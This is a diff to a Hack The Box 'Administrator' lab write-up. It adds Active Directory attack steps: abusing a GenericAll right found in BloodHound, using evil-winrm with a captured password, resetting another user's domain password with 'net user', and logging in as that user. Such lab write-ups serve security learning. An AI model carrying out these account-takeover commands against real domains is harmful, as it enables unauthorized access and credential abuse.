@@ -103,7 +103,7 @@ ref: ldap://administrator.htb0/DC=administrator,DC=htb0
 ```
 and by using the NETBIOS format we see that there is an entry on the domain controller.
 
-Now that we have confirmed these are domain user credentials, we can use bloodhound.py to ingest the LDAP data from the domain controller. Normally we would use Sharphound.exe, but that would require access to a Windows host which we don't have. Bloodhound.py only requires domain credentials:
+Now that we have confirmed these are domain user credentials, we can use bloodhound.py to ingest the LDAP data from the domain controller. 
 ```
 pipx install bloodhound-ce
 
@@ -131,8 +131,40 @@ Then we can use our bloodhound installation (installation guide at https://blood
 
 After everything is imported, we can go ahead and find all the attributes of our user Olivia in Bloodhound.
 
-In pathfinding, we see that Olivia has GenericAll permissions to a user called Michael:
-![image tooltip](images\screenshots\Screenshot%202025-06-07%20135530.png)
+In pathfinding, we see that Olivia has GenericAll permissions to a user called Michael, meaning that we have complete control over the user object Michael:
+![image tooltip](images/screenshots/Screenshot%202025-06-07%20135530.png)
+
+We can then use the net user 
+
+From the nmap scan, since port 5985 is open on the domain controller 10.10.11.42, we can use evil win-rm to login with Olivia's credentials and change the password of Michael's account:
+```
+sudo evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Password123@ /domain
+The command completed successfully.
+```
+Now we can connect to Michael's account:
+```
+sudo evil-winrm -i 10.10.11.42 -u michael -p Password123@
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\michael\Documents> 
+```
+
+
 
 
 
